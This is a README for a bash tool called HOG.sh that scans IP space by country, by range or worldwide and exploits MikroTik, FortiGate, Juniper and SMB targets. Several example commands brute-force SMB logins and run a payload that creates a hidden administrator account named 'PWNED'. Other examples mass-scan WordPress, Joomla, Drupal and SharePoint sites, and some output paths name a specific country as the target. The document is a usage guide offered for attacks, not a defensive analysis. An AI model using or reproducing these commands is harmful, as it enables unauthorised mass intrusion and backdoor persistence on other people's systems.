# HOG
Options:</br>
        -c  get specefic country ip</br>
        -o for path of save ip /tmp/ips</br>
        -p for just one port scanning like -p 80 get all 80 port</br>
        -pp for scanning multi port like -pp 80,3389,22</br>
        -r for specefic range like 1.1.1.1-2.2.2.2</br>
        -l for import file ip range for scanning you file must be cidr ip range like 1.1.1.0/24</br>
        -s for give me site target.com i will check you site range port scanning you can use -p or -pp for site range</br>
        -e for exploiting support mikrotik fortigate smb juniper</br>
        -scan for scanning support wordpress joomla drupal sharepoint</br>
        -uf user file  this switch use for smb exploit brute force for compelte smb exploit</br>
        -pf password file this switch use for smb exploit brute force for compelte smb exploit</br>
        -cmd this switch use for smb exploit you can add your desire command that want run after exploiting see down here in examples"</br>
      
Examples:</br>
bash HOG.sh -c CountryNAME -p 80 -o /tmp/CountryName80</br>
bash HOG.sh -c CountryName -pp 80,3389  -o  /tmp/CountryName80-3389</br>
bash HOG.sh -r 1.1.1.1-2.2.2.2 -p 80 -o /tmp/rangeport80</br>
bash HOG.sh -r 1.1.1.1-2.2.2.2 -pp 80,3389 -o /tmp/rangeport80-3389</br>
bash HOG.sh -l /tmp/target -p 80 -o /tmp/target80</br>
bash HOG.sh -l  /tmp/target  -pp 80,3389 -o /tmp/target80-3389</br>
bash HOG.sh -s x.com  -p 80  -o  /tmp/xrange80</br>
bash HOG.sh -s x.com -pp 80,3389  -o   /tmp/xrange80-3389</br>
bash HOG.sh -cs  -p 445 -o  /tmp/world445</br>
bash HOG.sh -e smb -c CountryName -uf usr -pf pwd -cmd \"net user PWNED /ad & net localgroup administrators PWNED /ad\"</br>
bash HOG.sh -e smb -r 1.1.1.1-2.2.2.2 -uf usr -pf pwd -cmd \"net user PWNED /ad & net localgroup administrators PWNED /ad\"</br>
bash HOG.sh -e smb -l /tmp/target  -uf usr -pf pwd -cmd \"net user PWNED /ad & net localgroup administrators PWNED /ad\"</br>
bash HOG.sh -e smb -cs   -uf usr -pf pwd -cmd \"net user PWNED /ad & net localgroup administrators PWNED /ad\"</br>
bash HOG.sh -e mikrotik -c CountryName  -o /tmp/CountryNamemikexp</br>
bash HOG.sh -e mikrotik -r 1.1.1.1-2.2.2.2 -o /tmp/rangemikrotikexp</br>
bash HOG.sh -e mikrotik -l /tmp/target -o /tmp/targetmikrotikexp</br>
bash HOG.sh -e mikrotik -cs   -o /tmp/worldmikrotikexp</br>
bash HOG.sh -e fortigate -c CountryName -o /tmp/CountryNamefortigateexp</br>
bash HOG.sh -e fortigate -r 1.1.1.1-2.2.2.2 -o /tmp/rangefortigateexp</br>
bash HOG.sh -e fortigate -l /tmp/target -o /tmp/targetfortigateexp</br>
bash HOG.sh -e fortigate -cs   -o /tmp/worldfortigateexp</br>
bash HOG.sh -e juniper -c CountryName -o /tmp/afghanjuniperexp</br>
bash HOG.sh -e juniper -r 1.1.1.1-2.2.2.2 -o /tmp/rangejuniperexp</br>
bash HOG.sh -e juniper -l /tmp/target  -o /tmp/targetjuniperexp</br>
bash HOG.sh -e juniper -cs   -o /tmp/worldjuniperexp</br>
bash HOG.sh -scan wordpress -l /tmp/wpfile -o /tmp/wpout</br>
bash HOG.sh -scan joomla -l /tmp/joomfile -o /tmp/joomout</br>
bash HOG.sh -scan sharepoint -l /tmp/spfile -o /tmp/sharepointout</br>
bash HOG.sh -scan drupal -l /tmp/drupfile -o /tmp/drupalout </br>
bash HOG.sh -dns</br>
bash HOG.sh -sub</br>
bash HOG.sh -l /tmp/targets -checks -o /tmp/targets/ </br>
bash HOG.sh -c CountryName -router -o /tmp/afghanrouters/ </br>
bash HOG.sh -c CountryName -range -o /tmp/afghanrange </br>
bash HOG.sh -l /tmp/sshcheck -ssh -o /tmp/sshenum</br>
bash HOG.sh -l /tmp/rdp -rdp /tmp/screenshot/ </br>
bash HOG.sh -l /tmp/tg -scan webserver -o /tmp/webserver</br>
bash HOG.sh -l /tmp/tg -headers -o /tmp/header "</br>

